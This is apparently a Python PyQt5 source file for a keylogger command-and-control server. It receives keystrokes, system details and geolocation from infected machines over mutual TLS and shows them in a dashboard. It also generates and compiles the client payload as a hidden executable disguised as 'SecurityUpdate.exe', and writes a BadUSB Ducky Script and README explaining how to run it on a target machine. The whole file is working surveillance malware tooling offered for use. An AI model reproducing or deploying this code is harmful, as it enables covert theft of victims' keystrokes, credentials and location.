import os
import shutil
import socket
import ssl
import subprocess
import sys
import threading
from contextlib import contextmanager
from dataclasses import dataclass
from datetime import datetime
from typing import Dict, Optional

from PyQt5.QtCore import pyqtSignal, QObject, QThread
from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox, QProgressDialog, QFileDialog

from config_manager import get_config_manager
from gui.controllers.Dashboard import Ui_MainWindow
from gui.controllers.PrepareClientPayload import Ui_PrepareClientPayload
from gui.controllers.SetEmailInfo import Ui_SetEmaiInfo


@dataclass
class ClientInfo:
    """Immutable client information"""
    socket: socket.socket
    address: tuple
    client_id: str
    common_name: Optional[str] = None

    def __str__(self):
        return f"{self.address[0]}:{self.address[1]}" + (
            f" ({self.common_name})" if self.common_name else ""
        )


@dataclass
class ServerConfig:
    """Server configuration settings"""
    host: str = '0.0.0.0'
    port: int = 10000
    max_clients: int = 1
    cert_dir: str = 'certs'

    @property
    def server_cert(self) -> str:
        return os.path.join(self.cert_dir, 'server_cert.pem')

    @property
    def server_key(self) -> str:
        return os.path.join(self.cert_dir, 'server_key.pem')

    @property
    def ca_cert(self) -> str:
        return os.path.join(self.cert_dir, 'ca_cert.pem')

    @property
    def crl_file(self) -> str:
        return os.path.join(self.cert_dir, 'crl.pem')




class SSLContextManager:
    """Manages SSL/TLS context creation and validation"""

    def __init__(self, config: ServerConfig):
        self.config = config
        self._context: Optional[ssl.SSLContext] = None

    def create_context(self) -> ssl.SSLContext:
        """Create and configure SSL context with mTLS"""
        if self._context:
            return self._context

        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)

            # Load certificates
            context.load_cert_chain(
                certfile=self.config.server_cert,
                keyfile=self.config.server_key
            )

            # Require client certificate (mutual TLS)
            context.verify_mode = ssl.CERT_REQUIRED
            context.load_verify_locations(cafile=self.config.ca_cert)

            # Load CRL if available
            if os.path.exists(self.config.crl_file):
                context.load_verify_locations(cafile=self.config.crl_file)
                context.verify_flags = ssl.VERIFY_CRL_CHECK_LEAF

            # Strong cipher suites
            context.set_ciphers(
                'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:'
                '!aNULL:!MD5:!DSS'
            )

            # Minimum TLS 1.2
            context.minimum_version = ssl.TLSVersion.TLSv1_2

            self._context = context
            self._log_context_info()
            return context

        except FileNotFoundError as e:
            raise RuntimeError(
                f"Certificate file not found: {e}\n"
                "Please run generate_certificates.py first!"
            )
        except Exception as e:
            raise RuntimeError(f"Error creating SSL context: {e}")

    def _log_context_info(self):
        """Log SSL context configuration"""
        print("[+] SSL context created successfully")
        print(f"    - Server cert: {self.config.server_cert}")
        print(f"    - CA cert: {self.config.ca_cert}")
        print(f"    - CRL: {'enabled' if os.path.exists(self.config.crl_file) else 'disabled'}")
        print("    - Client auth: REQUIRED")




class ClientManager:
    """Manages client connections with thread-safe operations"""

    def __init__(self, max_clients: int = 1):
        self.max_clients = max_clients
        self._clients: Dict[str, ClientInfo] = {}
        self._lock = threading.Lock()

    def can_accept_client(self) -> bool:
        """Check if server can accept more clients"""
        with self._lock:
            return len(self._clients) < self.max_clients

    def add_client(self, client_info: ClientInfo) -> bool:
        """Add client if space available"""
        with self._lock:
            if len(self._clients) >= self.max_clients:
                return False
            self._clients[client_info.client_id] = client_info
            return True

    def remove_client(self, client_id: str) -> Optional[ClientInfo]:
        """Remove and return client info"""
        with self._lock:
            return self._clients.pop(client_id, None)

    def get_client(self, client_id: str) -> Optional[ClientInfo]:
        """Get client info"""
        with self._lock:
            return self._clients.get(client_id)

    @contextmanager
    def get_clients_snapshot(self):
        """Thread-safe iteration over clients"""
        with self._lock:
            snapshot = list(self._clients.items())
        yield snapshot




class Worker(QObject):
    """Handles server operations in background thread"""

    # Signals
    keylog_signal = pyqtSignal(str, str)  # (client_id, data)
    computer_info_signal = pyqtSignal(str, str)
    geo_location_signal = pyqtSignal(str, str)
    client_connected_signal = pyqtSignal(str)
    client_disconnected_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)

    def __init__(self, config: ServerConfig):
        super().__init__()
        self.config = config
        self.ssl_manager = SSLContextManager(config)
        self.client_manager = ClientManager(config.max_clients)
        self._running = False

    def start_server(self):
        """Start listening for client connections"""
        self._running = True

        try:
            ssl_context = self.ssl_manager.create_context()
        except RuntimeError as e:
            self.error_signal.emit(str(e))
            return

        # Create and bind socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as bind_socket:
            bind_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            bind_socket.bind((self.config.host, self.config.port))
            bind_socket.listen(5)

            print(f"[*] Server listening on {self.config.host}:{self.config.port}")
            print("[*] Waiting for client connections...")

            while self._running:
                try:
                    self._accept_client(bind_socket, ssl_context)
                except Exception as e:
                    print(f"[!] Error in accept loop: {e}")

    def _accept_client(self, bind_socket: socket.socket, ssl_context: ssl.SSLContext):
        """Accept and process a single client connection"""
        raw_socket, address = bind_socket.accept()

        # Check capacity
        if not self.client_manager.can_accept_client():
            print(f"[-] Connection rejected from {address}: Server full")
            raw_socket.close()
            return

        print(f"[*] Raw connection from {address}, initiating SSL handshake...")

        # Wrap with SSL
        try:
            ssl_socket = ssl_context.wrap_socket(raw_socket, server_side=True)
            client_info = self._extract_client_info(ssl_socket, address)
        except ssl.SSLError as e:
            print(f"[!] SSL handshake failed from {address}: {e}")
            raw_socket.close()
            return
        except Exception as e:
            print(f"[!] Error during SSL handshake from {address}: {e}")
            raw_socket.close()
            return

        # Add to manager
        if not self.client_manager.add_client(client_info):
            print(f"[-] Could not add client {client_info}")
            ssl_socket.close()
            return

        print(f"[+] Client authenticated: {client_info}")
        self.client_connected_signal.emit(client_info.client_id)

        # Handle in separate thread
        thread = threading.Thread(
            target=self._handle_client,
            args=(client_info,),
            daemon=True
        )
        thread.start()

    def _extract_client_info(self, ssl_socket: socket.socket, address: tuple) -> ClientInfo:
        """Extract client information from SSL socket"""
        common_name = None
        cert = ssl_socket.getpeercert()

        if cert:
            for subject in cert.get('subject', []):
                for key, value in subject:
                    if key == 'commonName':
                        common_name = value
                        break

        client_id = f"{address[0]}:{address[1]}"

        print(f"[+] SSL handshake successful!")
        print(f"    - Cipher: {ssl_socket.cipher()}")
        print(f"    - TLS Version: {ssl_socket.version()}")

        return ClientInfo(
            socket=ssl_socket,
            address=address,
            client_id=client_id,
            common_name=common_name
        )

    def _handle_client(self, client_info: ClientInfo):
        """Handle data from connected client"""
        try:
            buffer = ""
            while self._running:
                try:
                    data = client_info.socket.recv(4096).decode('utf-8', errors='ignore')
                    if not data:
                        break

                    buffer += data
                    # Process complete messages (assuming newline-delimited)
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        self._process_message(client_info.client_id, line.strip())

                except UnicodeDecodeError as e:
                    print(f"[!] Decode error from {client_info.client_id}: {e}")
                    continue
                except Exception as e:
                    print(f"[!] Error receiving from {client_info.client_id}: {e}")
                    break

        finally:
            self._disconnect_client(client_info)

    def _process_message(self, client_id: str, data: str):
        """Process received message and emit appropriate signal"""
        if not data:
            return

        print(f"[+] Data from {client_id}: {data[:100]}...")

        if data.startswith("KEYLOG:"):
            self.keylog_signal.emit(client_id, data[7:].strip())
        elif data.startswith("COMPUTER_INFO:"):
            formatted = data[15:].strip().replace(" | ", "\n")
            self.computer_info_signal.emit(client_id, formatted)

        elif data.startswith("GEO_LOCATION:"):
            formatted = data[13:].strip().replace(" | ", "\n")
            self.geo_location_signal.emit(client_id, formatted)

        else:
            print(f"[!] Unknown message type: {data[:50]}")

    def _disconnect_client(self, client_info: ClientInfo):
        """Clean up disconnected client"""
        try:
            client_info.socket.close()
        except:
            pass

        self.client_manager.remove_client(client_info.client_id)
        print(f"[-] Client disconnected: {client_info.client_id}")
        self.client_disconnected_signal.emit(client_info.client_id)

    def stop(self):
        """Stop the server"""
        self._running = False




class CompilerThread(QThread):
    """Handle PyInstaller compilation in background"""

    progress = pyqtSignal(str)
    finished = pyqtSignal(bool, str, str)  # (success, output_path, error)

    def __init__(self, export_dir: str):
        super().__init__()
        self.export_dir = export_dir

    def run(self):
        """Execute compilation process"""
        try:
            self.progress.emit("Starting compilation...")

            separator = ";" if os.name == "nt" else ":"

            compile_cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--add-data", f"certs{separator}certs",
                "--name", "SecurityUpdate",
                "--clean",
                "--noconfirm",
                "program_payload.py"
            ]

            self.progress.emit("Running PyInstaller (1-2 minutes)...")

            result = subprocess.run(
                compile_cmd,
                capture_output=True,
                text=True,
                timeout=300
            )

            if result.returncode != 0:
                self.finished.emit(False, "", result.stderr)
                return

            self.progress.emit("Compilation complete. Copying files...")

            exe_source = os.path.join("dist", "SecurityUpdate.exe")
            if not os.path.exists(exe_source):
                self.finished.emit(False, "", "EXE not found after compilation")
                return

            exe_dest = os.path.join(self.export_dir, "SecurityUpdate.exe")
            shutil.copy(exe_source, exe_dest)

            self.finished.emit(True, self.export_dir, "")

        except subprocess.TimeoutExpired:
            self.finished.emit(False, "", "Compilation timeout (5 minutes)")
        except Exception as e:
            self.finished.emit(False, "", str(e))




class MainWindow(QMainWindow):
    """Main application window"""

    def __init__(self):
        super().__init__()

        # Configuration
        self.config = ServerConfig()
        self.app_config = get_config_manager()

        # Setup UI
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self._setup_displays()
        self._connect_signals()

        # Start server
        self._start_server()

    def _setup_displays(self):
        """Configure display widgets"""
        self.computer_info_display = self.ui.plainTextEdit
        self.geo_location_display = self.ui.plainTextEdit_2
        self.keylog_display = self.ui.plainTextEdit_3

        self.keylog_display.setPlaceholderText("Waiting for client...")
        self.computer_info_display.setPlaceholderText("No computer info")
        self.geo_location_display.setPlaceholderText("No geo-location data")

    def _connect_signals(self):
        """Connect UI signals to slots"""
        self.ui.PrepareClientPayload.clicked.connect(self._open_payload_window)
        self.ui.ExportForBadUSB.clicked.connect(self._export_badusb)
        self.ui.actionSet_Email_Info.triggered.connect(self._open_email_info)
        self.ui.RefreshButton.clicked.connect(self._refresh_logs)
        self.ui.actionLight_Mode.triggered.connect(lambda: self._set_theme("light"))
        self.ui.actionDark_Mode.triggered.connect(lambda: self._set_theme("dark"))
        self.ui.actionGenerate_Certificates.triggered.connect(self._generate_certificates)
        self.ui.actionRevoke_Certificate.triggered.connect(self._revoke_certificate)

    def _generate_certificates(self):
        """Generate SSL certificates"""
        subprocess.run(["python", "generate_certificates.py"])
        print("[*] Certificates generated")

    def _revoke_certificate(self):
        """Revoke a client certificate"""
        from PyQt5.QtWidgets import QInputDialog

        # Get list of client certificates
        if os.path.exists("certs"):
            cert_files = [f.replace("_cert.pem", "") for f in os.listdir("certs")
                          if f.endswith("_cert.pem")
                          and not f.startswith("server")
                          and not f.startswith("ca")]

            if cert_files:
                client_name, ok = QInputDialog.getItem(
                    self, "Revoke Certificate",
                    "Select client:",
                    cert_files,
                    0,
                    False
                )

                if ok:
                    subprocess.run(["python", "revoke_certificates.py", "revoke", client_name])
                    print(f"[*] Certificate revoked: {client_name}")

    def _start_server(self):
        """Initialize and start server worker"""
        self.worker = Worker(self.config)
        self.worker.keylog_signal.connect(self._update_keylog)
        self.worker.computer_info_signal.connect(self._update_computer_info)
        self.worker.geo_location_signal.connect(self._update_geo_location)
        self.worker.client_connected_signal.connect(self._on_client_connected)
        self.worker.client_disconnected_signal.connect(self._on_client_disconnected)
        self.worker.error_signal.connect(self._on_server_error)

        thread = threading.Thread(target=self.worker.start_server, daemon=True)
        thread.start()

    # Signal Handlers

    def _on_client_connected(self, client_id: str):
        """Handle client connection"""
        print(f"[MainWindow] Client connected: {client_id}")
        self.setWindowTitle(f"Keylogger Server - Connected: {client_id}")
        self.keylog_display.setPlaceholderText(f"Connected: {client_id}")

    def _on_client_disconnected(self, client_id: str):
        """Handle client disconnection"""
        print(f"[MainWindow] Client disconnected: {client_id}")
        self.setWindowTitle("Keylogger Server - No Client")
        self.keylog_display.appendPlainText("\n--- Client Disconnected ---\n")

    def _on_server_error(self, error: str):
        """Handle server errors"""
        QMessageBox.critical(self, "Server Error", error)

    def _update_keylog(self, client_id: str, data: str):
        """Update keylog display"""
        self.keylog_display.appendPlainText(data)

    def _update_computer_info(self, client_id: str, data: str):
        """Update computer info display"""
        self.computer_info_display.setPlainText(data.strip())

    def _update_geo_location(self, client_id: str, data: str):
        """Update geo-location display"""
        self.geo_location_display.setPlainText(data)

    # UI Actions

    def _open_payload_window(self):
        """Open payload generation window"""
        try:
            self.payload_window = QMainWindow()
            self.payload_ui = Ui_PrepareClientPayload()
            self.payload_ui.setupUi(self.payload_window)

            # Load saved settings
            settings = self.app_config.get_server_settings()
            self.payload_ui.lineEdit.setText(settings.get("server_ip", ""))
            self.payload_ui.lineEdit_2.setText(str(settings.get("server_port", 10000)))

            self.payload_ui.pushButton.clicked.connect(self._generate_payload)
            self.payload_window.show()

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Could not open window: {e}")

    def _generate_payload(self):
        """Generate client payload with server settings"""
        server_ip = self.payload_ui.lineEdit.text().strip()
        server_port = self.payload_ui.lineEdit_2.text().strip()

        # Validation
        if not server_ip:
            QMessageBox.warning(self.payload_window, "Error", "Server IP required")
            return

        try:
            port = int(server_port) if server_port else 10000
            if not 1 <= port <= 65535:
                raise ValueError()
        except ValueError:
            QMessageBox.warning(self.payload_window, "Error", "Invalid port")
            return

        # Generate payload
        try:
            with open("program.py", "r") as f:
                code = f.read()

            modified = code.replace(
                'SSL_SERVER_HOST = "127.0.0.1"',
                f'SSL_SERVER_HOST = "{server_ip}"'
            ).replace(
                'SSL_SERVER_PORT = 10000',
                f'SSL_SERVER_PORT = {port}'
            )

            with open("program_payload.py", "w") as f:
                f.write(modified)

            # Save config
            self.app_config.set_server_settings(server_ip, str(port), "client1")

            QMessageBox.information(
                self.payload_window,
                "Success",
                f"Payload generated!\n\n"
                f"File: program_payload.py\n"
                f"Server: {server_ip}:{port}"
            )

        except Exception as e:
            QMessageBox.critical(self.payload_window, "Error", str(e))

    def _export_badusb(self):
        """Export BadUSB package with compiled EXE"""
        # Validation checks
        if not os.path.exists("program_payload.py"):
            QMessageBox.warning(
                self, "Error",
                "Generate payload first!\n\nClick 'Generate Payload'"
            )
            return

        if not os.path.exists("certs"):
            QMessageBox.critical(self, "Error", "Certs folder missing!")
            return

        # Check PyInstaller
        try:
            subprocess.run(
                ["pyinstaller", "--version"],
                capture_output=True,
                check=True,
                timeout=5
            )
        except:
            reply = QMessageBox.question(
                self, "Install PyInstaller?",
                "PyInstaller required. Install now?",
                QMessageBox.Yes | QMessageBox.No
            )
            if reply == QMessageBox.No:
                return

            result = subprocess.run(
                ["pip", "install", "pyinstaller"],
                capture_output=True
            )
            if result.returncode != 0:
                QMessageBox.critical(self, "Error", "Installation failed")
                return
        #Ask user to choose save location
        save_directory = QFileDialog.getExistingDirectory(
            self,
            "Select Folder to save BadUSB package",
            os.path.expanduser("~"),
            QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks
        )
        if not save_directory:
            return



        # Confirm compilation
        reply = QMessageBox.question(
            self, "Compile",
            "Ready to compile (1-2 minutes).\n\nContinue?",
            QMessageBox.Yes | QMessageBox.No
        )
        if reply == QMessageBox.No:
            return

        #Create export directory with timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        folder_name = f"BadUSB_Package_{timestamp}"
        export_dir = os.path.join(save_directory, folder_name)
        os.makedirs(export_dir, exist_ok=True)

        #Show progress dialog
        progress = QProgressDialog("Compiling...", "Cancel", 0, 0, self)
        progress.setWindowModality(2)
        progress.show()

        #Start Compilation Thread
        self.compiler_thread = CompilerThread(export_dir)
        self.compiler_thread.progress.connect(progress.setLabelText)
        self.compiler_thread.finished.connect(
            lambda success, path, error: self._on_compile_finished(
                success, path, error, progress, export_dir
            )
        )
        self.compiler_thread.start()


    def _on_compile_finished(self, success, path, error, progress, export_dir):
        """Handle compilation completion"""
        progress.close()

        if not success:
            QMessageBox.critical(self, "Failed", f"Compilation error:\n{error}")
            return

        # Create additional files
        self._create_ducky_script(export_dir)
        self._create_readme(export_dir)

        # Cleanup
        for folder in ['build', 'dist', '__pycache__']:
            if os.path.exists(folder):
                shutil.rmtree(folder, ignore_errors=True)
        for file in ['SecurityUpdate.spec']:
            if os.path.exists(file):
                os.remove(file)

        QMessageBox.information(
            self, "Success!",
            f"BadUSB package created!\n\n{export_dir}"
        )

        # Open folder
        if os.name == "nt":
            os.startfile(export_dir)

    def _create_ducky_script(self, export_dir: str):
        """Create Ducky Script for BadUSB"""
        script = """REM BadUSB Payload - Automated Deployment
LOCALE US
DELAY 500
GUI r
DELAY 1000
STRING cmd
ENTER
DELAY 1000
STRING cd [!!!!!REPLACE WITH ACTUALL DESTINATION OF BADUSB FOLDER!!!!!]
ENTER
DELAY 1000
STRING SecurityUpdate.exe
ENTER
DELAY 500
ALT F4
"""

        with open(os.path.join(export_dir, "inject.txt"), "w") as f:
            f.write(script)

    def _create_readme(self, export_dir: str):
        """Create README file"""
        readme = """# BadUSB Deployment Package

## Files Included
- SecurityUpdate.exe: Compiled payload with embedded certificates
- inject.txt: Ducky Script for BadUSB devices
- README.md: This file

## Deployment Steps
1. Copy SecurityUpdate.exe to target or web server
2. Update inject.txt with your server URL
3. Flash inject.txt to BadUSB device
4. Connect BadUSB to target machine

## Security Notes
- Uses mutual TLS authentication
- All traffic encrypted
- Client certificate validation enabled

## Support
Ensure server is running before deployment.
"""
        with open(os.path.join(export_dir, "README.md"), "w") as f:
            f.write(readme)

    def _open_email_info(self):
        """Open email configuration window"""
        self.email_window = QMainWindow()
        self.email_ui = Ui_SetEmaiInfo()
        self.email_ui.setupUi(self.email_window)
        self.email_window.show()

    def _refresh_logs(self):
        """Clear all displays"""
        self.keylog_display.clear()
        self.computer_info_display.clear()
        self.geo_location_display.clear()
        print("[*] Logs cleared")

    def _set_theme(self, theme: str):
        """Set application theme"""
        if theme == "light":
            self.setStyleSheet("background-color: white; color: black;")
        else:
            self.setStyleSheet("background-color: #2E2E2E; color: white;")
        print(f"[*] Theme: {theme}")



def main():
    """Application entry point"""
    app = QApplication(sys.argv)
    app.setApplicationName("Keylogger Server")
    app.setOrganizationName("SecurityTools")

    window = MainWindow()
    window.show()

    sys.exit(app.exec_())


if __name__ == "__main__":
    main()